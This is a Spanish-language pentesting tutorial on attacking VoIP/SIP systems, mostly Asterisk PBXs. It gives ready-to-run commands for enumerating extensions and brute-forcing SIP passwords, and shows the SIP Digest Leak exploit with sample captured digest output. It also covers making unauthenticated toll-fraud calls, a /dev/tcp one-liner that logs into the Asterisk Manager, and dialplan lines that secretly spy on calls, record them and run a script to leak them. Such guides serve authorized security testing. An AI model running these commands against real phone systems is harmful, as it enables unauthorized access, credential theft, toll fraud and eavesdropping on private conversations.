# Pentesting VoIP

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Informaci√≥n B√°sica sobre VoIP

Para comenzar a aprender c√≥mo funciona VoIP, consulta:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Mensajes B√°sicos

```
Mensaje	  Descripci√≥n								                                              Referencia al RFC
---------------------------------------------------------------------------------------------------
REGISTER	Registra un usuario SIP.					                                      RFC 3261
INVITE		Comienza in di√°logo para establecer una llamada. 	                      RFC 3261
ACK		    Acuse de recibo.                    					                          RFC 3261
BYE		    Finaliza una llamada.                          				                  RFC 3261
CANCEL		cancela una petici√≥n pendiente.				                                  RFC 3261
UPDATE		Modifica el estado de una sesi√≥n en curso.                            	RFC 3311
REFER		  Solicita una transferencia de llamada.                            	    RFC 3515
PRACK		  ACK provisional.            						                                RFC 3262
SUBSCRIBE	Suscribe un dispositivo para recibir notificaciones.                	  RFC 6665
NOTIFY		Informa a un suscriptor sobre un cambio de estado.  			              RFC 6665
PUBLISH		Publica un evento al servidor de notificaciones.	                      RFC 3903
MESSAGE		Env√≠a un mensaje instant√°neo de texto.                        		      RFC 3428
INFO		  Mensaje de informaci√≥n.	                                                RFC 6086
OPTIONS		Solicita las capacidades de un endpoint.                      					RFC 3261
```

## C√≥digos de respuesta

**1xx‚ÄîRespuestas Provisionales**

```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```

**2xx‚ÄîRespuestas Satisfactorias**

```
200 OK
202 Accepted
204 No Notification
```

**3xx‚ÄîRedirecciones**

```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```

**4xx‚ÄîFallo de Cliente**

```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```

**5xx‚ÄîFallo de Servidor**

```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```

**6xx‚ÄîFallo Global**

```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```

## Enumeraci√≥n de VoIP

### N√∫meros de Tel√©fono

Uno de los primeros pasos que un Equipo Rojo podr√≠a realizar es buscar n√∫meros de tel√©fono disponibles para contactar con la empresa utilizando herramientas de OSINT, b√∫squedas en Google o raspando las p√°ginas web.

Una vez que tengas los n√∫meros de tel√©fono, podr√≠as utilizar servicios en l√≠nea para identificar el operador:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Saber si el operador proporciona servicios VoIP podr√≠a ayudarte a identificar si la empresa est√° utilizando VoIP... Adem√°s, es posible que la empresa no haya contratado servicios VoIP pero est√© utilizando tarjetas PSTN para conectar su propia PBX VoIP a la red telef√≥nica tradicional.

Cosas como respuestas autom√°ticas de m√∫sica generalmente indican que se est√° utilizando VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informaci√≥n de OSINT

Cualquier otra enumeraci√≥n de OSINT que ayude a identificar el software VoIP que se est√° utilizando ser√° √∫til para un Equipo Rojo.

### Enumeraci√≥n de Red

* **`nmap`** es capaz de escanear servicios UDP, pero debido a la cantidad de servicios UDP que se est√°n escaneando, es muy lento y es posible que no sea muy preciso con este tipo de servicios.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** de SIPVicious (`sudo apt install sipvicious`): Localizar√° servicios SIP en la red indicada.
* `svmap` es **f√°cil de bloquear** porque utiliza el User-Agent `friendly-scanner`, pero podr√≠as modificar el c√≥digo desde `/usr/share/sipvicious/sipvicious` y cambiarlo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS scan es un esc√°ner muy r√°pido para servicios SIP sobre UDP, TCP o TLS. Utiliza multihilo y puede escanear grandes rangos de redes. Permite indicar f√°cilmente un rango de puertos, escanear tanto TCP como UDP, utilizar otro m√©todo (por defecto utilizar√° OPTIONS) y especificar un User-Agent diferente (y m√°s).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**: 

Metasploit es una herramienta de c√≥digo abierto ampliamente utilizada para pruebas de penetraci√≥n y desarrollo de exploits. Ofrece una amplia gama de funcionalidades para descubrir vulnerabilidades y realizar pruebas de seguridad en sistemas inform√°ticos.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumeraci√≥n Adicional de la Red

El PBX tambi√©n podr√≠a estar exponiendo otros servicios de red como:

- **69/UDP (TFTP)**: Actualizaciones de firmware
- **80 (HTTP) / 443 (HTTPS)**: Para gestionar el dispositivo desde la web
- **389 (LDAP)**: Alternativa para almacenar la informaci√≥n de los usuarios
- **3306 (MySQL)**: Base de datos MySQL
- **5038 (Manager)**: Permite usar Asterisk desde otras plataformas
- **5222 (XMPP)**: Mensajes utilizando Jabber
- **5432 (PostgreSQL)**: Base de datos PostgreSQL
- ¬°Y otros...

### Enumeraci√≥n de M√©todos

Es posible encontrar **qu√© m√©todos est√°n disponibles** para usar en el PBX utilizando `SIPPTS enumerate` de [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```

### Analizar respuestas del servidor

Es muy importante analizar las cabeceras que nos manda un servidor, dependiendo del tipo de mensaje y las cabeceras que le enviamos. Con `SIPPTS send` from [**sippts**](https://github.com/Pepelux/sippts) podemos personalizar todas las cabeceras de un mensaje y analizar las respuestas del servidor.

```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```

Tambi√©n es posible obtener datos si el servidor usa websockets. Con `SIPPTS wssend` from [**sippts**](https://github.com/Pepelux/sippts) podemos enviar mensajes usando WS.

```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```

### Enumeraci√≥n de Extensiones

Las extensiones en un sistema de PBX (Centralita Privada) se refieren a los **identificadores internos √∫nicos asignados a l√≠neas telef√≥nicas, dispositivos o usuarios individuales** dentro de una organizaci√≥n o empresa. Las extensiones permiten **enrutar llamadas dentro de la organizaci√≥n de manera eficiente**, sin la necesidad de n√∫meros de tel√©fono externos individuales para cada usuario o dispositivo.

* **`svwar`** de SIPVicious (`sudo apt install sipvicious`): `svwar` es un esc√°ner de l√≠neas de extensi√≥n de PBX SIP gratuito. En concepto, funciona de manera similar a los wardialers tradicionales al **adivinar un rango de extensiones o una lista dada de extensiones**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifica extensiones en un servidor SIP.
```bash
sippts exten -i 10.10.0.10 -e 100-200
```
* **metasploit**: Tambi√©n puedes enumerar extensiones/nombres de usuario con metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** es un enumerador de fuerza bruta de nombres de usuario del protocolo de intercambio de Asterisk (IAX). enumIAX puede operar en dos modos distintos; Adivinanza secuencial de nombres de usuario o Ataque de diccionario.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataques VoIP

### Fuerza Bruta de Contrase√±as - online

Habiendo descubierto la **PBX** y algunos **extensiones/nombres de usuario**, un Equipo Rojo podr√≠a intentar **autenticarse a trav√©s del m√©todo `REGISTER`** en una extensi√≥n utilizando un diccionario de contrase√±as comunes para realizar un ataque de fuerza bruta a la autenticaci√≥n.

{% hint style="danger" %}
Tenga en cuenta que un **nombre de usuario** puede ser el mismo que la extensi√≥n, pero esta pr√°ctica puede variar dependiendo del sistema PBX, su configuraci√≥n y las preferencias de la organizaci√≥n...

Si el nombre de usuario no es el mismo que la extensi√≥n, deber√° **averiguar el nombre de usuario para realizar un ataque de fuerza bruta**.
{% endhint %}

* **`svcrack`** de SIPVicious (`sudo apt install sipvicious`): SVCrack te permite crackear la contrase√±a para un nombre de usuario/extensi√≥n espec√≠fico en una PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```

* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack es un crackeador de contrase√±as remoto para servicios SIP. Rcrack puede comprobar contrase√±as de diferetnes usuarios en distintos rangos de IPs y puertos.
{% code overflow="wrap" %}
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing de VoIP

Si encuentras equipos de VoIP dentro de una **red Wifi abierta**, podr√≠as **capturar toda la informaci√≥n**. Adem√°s, si est√°s dentro de una red m√°s cerrada (conectado a trav√©s de Ethernet o Wifi protegida) podr√≠as realizar **ataques de MitM como** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre la **PBX y la pasarela** para capturar la informaci√≥n.

Entre la informaci√≥n de red, podr√≠as encontrar **credenciales web** para gestionar el equipo, **extensiones de usuario**, **nombre de usuario**, direcciones **IP**, incluso **contrase√±as hasheadas** y **paquetes RTP** que podr√≠as reproducir para **escuchar la conversaci√≥n**, y m√°s.

Para obtener esta informaci√≥n podr√≠as utilizar herramientas como Wireshark, tcpdump... pero una **herramienta especialmente creada para capturar conversaciones de VoIP es** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Ten en cuenta que si se utiliza **TLS en la comunicaci√≥n SIP** no podr√°s ver la comunicaci√≥n SIP en claro.\
Lo mismo suceder√° si se utiliza **SRTP** y **ZRTP**, los **paquetes RTP no estar√°n en texto claro**.
{% endhint %}

#### Credenciales SIP (Fuerza Bruta de Contrase√±as - offline)

[Revisa este ejemplo para entender mejor una **comunicaci√≥n de registro SIP**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) para aprender c√≥mo se env√≠an las **credenciales**.

* **`sipdump`** & **`sipcrack`,** parte de **sipcrack** (`apt-get install sipcrack`): Estas herramientas pueden **extraer** de un **pcap** las **autenticaciones digest** dentro del protocolo SIP y **realizar fuerza bruta** sobre ellas.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```

* **`SIPPTS dump`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump extrae autenticaciones de SIP Digest de un archivo PCAP.

```bash
sippts dump -f capture.pcap -o data.txt
```

* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack es una herramienta para crackear las autenticaciones digest dentro del protocolo SIP.

```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```

* **`SIPPTS tshark`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark extrae datos del protocolo SIP de un archivo PCAP.

```bash
sippts tshark -f capture.pcap [-filter auth]
```

#### C√≥digos DTMF

**No solo las credenciales SIP** se pueden encontrar en el tr√°fico de red, tambi√©n es posible encontrar c√≥digos DTMF que se utilizan, por ejemplo, para acceder al **correo de voz**.\
Es posible enviar estos c√≥digos en mensajes **INFO SIP**, en **audio** o dentro de **paquetes RTP**. Si los c√≥digos est√°n dentro de paquetes RTP, podr√≠as cortar esa parte de la conversaci√≥n y usar la herramienta multimo para extraerlos:
```bash
multimon -a DTMF -t wac pin.wav
```
### Llamadas gratuitas / Configuraciones incorrectas de conexiones de Asterisks

En Asterisk es posible permitir una conexi√≥n **desde una direcci√≥n IP espec√≠fica** o desde **cualquier direcci√≥n IP**:
```
host=10.10.10.10
host=dynamic
```
Si se especifica una direcci√≥n IP, el host **no necesitar√° enviar solicitudes REGISTER** de vez en cuando (en el paquete REGISTER se env√≠a el tiempo de vida, generalmente 30 minutos, lo que significa que en otro escenario el tel√©fono necesitar√° REGISTRARSE cada 30 minutos). Sin embargo, necesitar√° tener puertos abiertos que permitan conexiones desde el servidor VoIP para recibir llamadas.

Para definir usuarios, se pueden definir como:

- **`type=user`**: El usuario solo puede recibir llamadas como usuario.
- **`type=friend`**: Es posible realizar llamadas como peer y recibirlas como usuario (usado con extensiones).
- **`type=peer`**: Es posible enviar y recibir llamadas como peer (trunk SIP).

Tambi√©n es posible establecer confianza con la variable insegura:

- **`insecure=port`**: Permite conexiones peer validadas por IP.
- **`insecure=invite`**: No requiere autenticaci√≥n para mensajes INVITE.
- **`insecure=port,invite`**: Ambos.

{% hint style="warning" %}
Cuando se utiliza **`type=friend`**, el **valor** de la variable **host** **no se utilizar√°**, por lo que si un administrador **configura incorrectamente un trunk SIP** usando ese valor, **cualquiera podr√° conectarse a √©l**.

Por ejemplo, esta configuraci√≥n ser√≠a vulnerable:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Llamadas Gratuitas / Configuraciones Incorrectas de Contexto en Asterisk

En Asterisk, un **contexto** es un contenedor o secci√≥n nombrada en el plan de marcaci√≥n que **agrupa extensiones, acciones y reglas relacionadas**. El plan de marcaci√≥n es el componente central de un sistema Asterisk, ya que define **c√≥mo se manejan y enrutan las llamadas entrantes y salientes**. Los contextos se utilizan para organizar el plan de marcaci√≥n, gestionar el control de acceso y proporcionar separaci√≥n entre las diferentes partes del sistema.

Cada contexto se define en el archivo de configuraci√≥n, t√≠picamente en el archivo **`extensions.conf`**. Los contextos se indican con corchetes, con el nombre del contexto encerrado en ellos. Por ejemplo:
```bash
csharpCopy code[my_context]
```
Dentro del contexto, defines extensiones (patrones de n√∫meros marcados) y las asocias con una serie de acciones o aplicaciones. Estas acciones determinan c√≥mo se procesa la llamada. Por ejemplo:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Este ejemplo demuestra un contexto simple llamado "mi\_contexto" con una extensi√≥n "100". Cuando alguien marca 100, la llamada ser√° contestada, se reproducir√° un mensaje de bienvenida y luego la llamada ser√° terminada.

Este es **otro contexto** que permite **llamar a cualquier otro n√∫mero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si el administrador define el **contexto predeterminado** como:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Cualquier persona podr√° utilizar el **servidor para llamar a cualquier otro n√∫mero** (y el administrador del servidor pagar√° por la llamada).
{% endhint %}

{% hint style="danger" %}
Adem√°s, de forma predeterminada, el archivo **`sip.conf`** contiene **`allowguest=true`**, por lo tanto, **cualquier** atacante sin **autenticaci√≥n** podr√° llamar a cualquier otro n√∫mero.
{% endhint %}

*   **`SIPPTS invite`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite verifica si un **servidor PBX nos permite hacer llamadas sin autenticaci√≥n**. Si el servidor SIP tiene una configuraci√≥n incorrecta, nos permitir√° hacer llamadas a n√∫meros externos. Tambi√©n puede permitirnos transferir la llamada a un segundo n√∫mero externo.

Por ejemplo, si su servidor Asterisk tiene una mala configuraci√≥n de contexto, puede aceptar solicitudes INVITE sin autorizaci√≥n. En este caso, un atacante puede hacer llamadas sin conocer ning√∫n usuario/contrase√±a.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```

### Llamadas gratuitas / IVRS mal configurados

IVRS significa **Sistema de Respuesta de Voz Interactiva**, una tecnolog√≠a de telefon√≠a que permite a los usuarios interactuar con un sistema informatizado a trav√©s de voz o entradas de tonos t√°ctiles. IVRS se utiliza para construir sistemas de **manejo de llamadas automatizadas** que ofrecen una variedad de funcionalidades, como proporcionar informaci√≥n, dirigir llamadas y capturar la entrada del usuario.

IVRS en sistemas VoIP t√≠picamente consta de:

1. **Indicaciones de voz**: Mensajes de audio pregrabados que gu√≠an a los usuarios a trav√©s de las opciones del men√∫ IVR e instrucciones.
2. **Se√±alizaci√≥n DTMF** (Tono Dual de Multi-Frecuencia): Entradas de tonos t√°ctiles generadas al presionar teclas en el tel√©fono, que se utilizan para navegar a trav√©s de los men√∫s IVR y proporcionar entrada.
3. **Enrutamiento de llamadas**: Dirigir llamadas al destino apropiado, como departamentos espec√≠ficos, agentes o extensiones basadas en la entrada del usuario.
4. **Captura de entrada de usuario**: Recopilar informaci√≥n de los llamantes, como n√∫meros de cuenta, IDs de casos u otros datos relevantes.
5. **Integraci√≥n con sistemas externos**: Conectar el sistema IVR a bases de datos u otros sistemas de software para acceder o actualizar informaci√≥n, realizar acciones o activar eventos.

En un sistema VoIP Asterisk, puedes crear un IVR utilizando el plan de marcaci√≥n (archivo **`extensions.conf`**) y varias aplicaciones como `Background()`, `Playback()`, `Read()`, y m√°s. Estas aplicaciones te ayudan a reproducir indicaciones de voz, capturar la entrada del usuario y controlar el flujo de la llamada.

#### Ejemplo de configuraci√≥n vulnerable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
El siguiente es un ejemplo donde se le pide al usuario que **presione 1 para llamar** a un departamento, **2 para llamar** a otro, o **la extensi√≥n completa** si la conoce.\
La vulnerabilidad radica en que la **longitud de la extensi√≥n indicada no se verifica, por lo que un usuario podr√≠a ingresar un n√∫mero completo durante el tiempo de espera de 5 segundos y se realizar√° la llamada.**

### Inyecci√≥n de Extensi√≥n

Utilizando una extensi√≥n como:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Donde **`${EXTEN}`** es la **extensi√≥n** que se llamar√°, cuando se introduzca la **ext 101** esto es lo que suceder√≠a:
```scss
exten => 101,1,Dial(SIP/101)
```
Sin embargo, si **`${EXTEN}`** permite introducir **m√°s que n√∫meros** (como en versiones antiguas de Asterisk), un atacante podr√≠a introducir **`101&SIP123123123`** para llamar al n√∫mero de tel√©fono 123123123. Y este ser√≠a el resultado:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Por lo tanto, una llamada a la extensi√≥n **`101`** y **`123123123`** ser√° enviada y solo la primera en recibir la llamada se establecer√°... pero si un atacante utiliza una **extensi√≥n que evita cualquier coincidencia** que se est√© realizando pero que no existe, podr√≠a **inyectar una llamada solo al n√∫mero deseado**.

## Vulnerabilidad SIPDigestLeak

El SIP Digest Leak es una vulnerabilidad que afecta a una gran cantidad de tel√©fonos SIP, incluidos tanto tel√©fonos IP de hardware y software como adaptadores telef√≥nicos (de VoIP a anal√≥gico). La vulnerabilidad permite la **filtraci√≥n de la respuesta de autenticaci√≥n Digest**, que se calcula a partir de la contrase√±a. Un **ataque de contrase√±a sin conexi√≥n es entonces posible** y puede recuperar la mayor√≠a de las contrase√±as basadas en la respuesta al desaf√≠o.

**[Escenario de vulnerabilidad desde aqu√≠**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un tel√©fono IP (v√≠ctima) est√° escuchando en alg√∫n puerto (por ejemplo: 5060), aceptando llamadas telef√≥nicas
2. El atacante env√≠a un INVITE al tel√©fono IP
3. El tel√©fono de la v√≠ctima comienza a sonar y alguien contesta y cuelga (porque nadie responde al tel√©fono en el otro extremo)
4. Cuando se cuelga el tel√©fono, el **tel√©fono de la v√≠ctima env√≠a un BYE al atacante**
5. El **atacante emite una respuesta 407** que **solicita autenticaci√≥n** y emite un desaf√≠o de autenticaci√≥n
6. El **tel√©fono de la v√≠ctima proporciona una respuesta al desaf√≠o de autenticaci√≥n** en un segundo BYE
7. El **atacante puede entonces realizar un ataque de fuerza bruta** en la respuesta al desaf√≠o en su m√°quina local (o red distribuida, etc.) y adivinar la contrase√±a

* **SIPPTS leak** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS leak explota la vulnerabilidad SIP Digest Leak que afecta a un gran n√∫mero de tel√©fonos SIP. La salida puede ser almacenada en un fichero con formato SipCrack. Posteriormente se podr√° intentar crackear por fuerza bruta usando SIPPTS dcrack o la herramienta SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permite a un **usuario web** (que por ejemplo podr√≠a estar interesado en un producto) **introducir** su **n√∫mero de tel√©fono** para ser llamado. Luego se llamar√° a un comercial, y cuando **conteste el tel√©fono** el usuario ser√° **llamado y conectado con el agente**.

Un perfil com√∫n de Asterisk para esto es:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* El perfil anterior est√° permitiendo que **CUALQUIER direcci√≥n IP se conecte** (si se conoce la contrase√±a).
* Para **organizar una llamada**, como se especific√≥ anteriormente, **no es necesaria** la **lectura de permisos** y solo se necesita **originate** en **write**.

Con esos permisos, cualquier IP que conozca la contrase√±a podr√≠a conectarse y extraer demasiada informaci√≥n, como:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Se podr√≠a solicitar m√°s informaci√≥n o acciones.**

### **Escuchas**

En Asterisk es posible utilizar el comando **`ChanSpy`** indicando la **extensi√≥n(es) a monitorear** (o todas) para escuchar conversaciones que est√°n ocurriendo. Este comando debe ser asignado a una extensi√≥n.

Por ejemplo, **`exten => 333,1,ChanSpy('all',qb)`** indica que si **llamas** a la **extensi√≥n 333**, se **monitorear√°n** **`todas`** las extensiones, **comenzar√° a escuchar** cuando una nueva conversaci√≥n comience (**`b`**) en modo silencioso (**`q`**) ya que no queremos interactuar en ella. Puedes pasar de una conversaci√≥n a otra presionando **`*`**, o marcando el n√∫mero de extensi√≥n.

Tambi√©n es posible utilizar **`ExtenSpy`** para monitorear solo una extensi√≥n.

En lugar de escuchar las conversaciones, es posible **grabarlas en archivos** utilizando una extensi√≥n como:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Las llamadas se guardar√°n en **`/tmp`**.

Incluso podr√≠as hacer que Asterisk **ejecute un script que filtrar√° la llamada** cuando se cierre.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vulnerabilidad RTCPBleed

**RTCPBleed** es un importante problema de seguridad que afecta a los servidores VoIP basados en Asterisk (publicado en 2017). La vulnerabilidad permite que el tr√°fico de **RTP (Protocolo de Tiempo Real)**, que lleva las conversaciones VoIP, sea **interceptado y redirigido por cualquier persona en Internet**. Esto ocurre porque el tr√°fico de RTP evita la autenticaci√≥n al atravesar los firewalls de NAT (Traducci√≥n de Direcciones de Red).

Los proxies de RTP intentan abordar las **limitaciones de NAT** que afectan a los sistemas RTC al hacer de intermediarios en los flujos de RTP entre dos o m√°s partes. Cuando hay NAT en su lugar, el software de proxy de RTP a menudo no puede confiar en la informaci√≥n de IP y puerto de RTP obtenida a trav√©s de la se√±alizaci√≥n (por ejemplo, SIP). Por lo tanto, varios proxies de RTP han implementado un mecanismo donde dicho **tuplet de IP y puerto se aprende autom√°ticamente**. Esto se hace a menudo inspeccionando el tr√°fico de RTP entrante y marcando la IP y puerto de origen para cualquier tr√°fico de RTP entrante como el que deber√≠a recibir una respuesta. Este mecanismo, que puede llamarse "modo de aprendizaje", **no utiliza ning√∫n tipo de autenticaci√≥n**. Por lo tanto, los **atacantes** pueden **enviar tr√°fico de RTP al proxy de RTP** y recibir el tr√°fico de RTP intermediado destinado al llamante o al llamado de un flujo de RTP en curso. Llamamos a esta vulnerabilidad RTP Bleed porque permite a los atacantes recibir flujos de medios de RTP destinados a ser enviados a usuarios leg√≠timos.

Otro comportamiento interesante de los proxies de RTP y las pilas de RTP es que a veces, **incluso si no son vulnerables a RTP Bleed**, aceptar√°n, reenviar√°n y/o procesar√°n paquetes de RTP de cualquier origen. Por lo tanto, los atacantes pueden enviar paquetes de RTP que les permitan inyectar sus medios en lugar de los leg√≠timos. Llamamos a este ataque Inyecci√≥n de RTP porque permite la inyecci√≥n de paquetes de RTP ileg√≠timos en flujos de RTP existentes. Esta vulnerabilidad puede encontrarse tanto en proxies de RTP como en puntos finales.

Asterisk y FreePBX han utilizado tradicionalmente el ajuste **`NAT=yes`**, que permite que el tr√°fico de RTP evite la autenticaci√≥n, lo que potencialmente conduce a la ausencia de audio o audio unidireccional en las llamadas.

Para obtener m√°s informaci√≥n, consulta [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

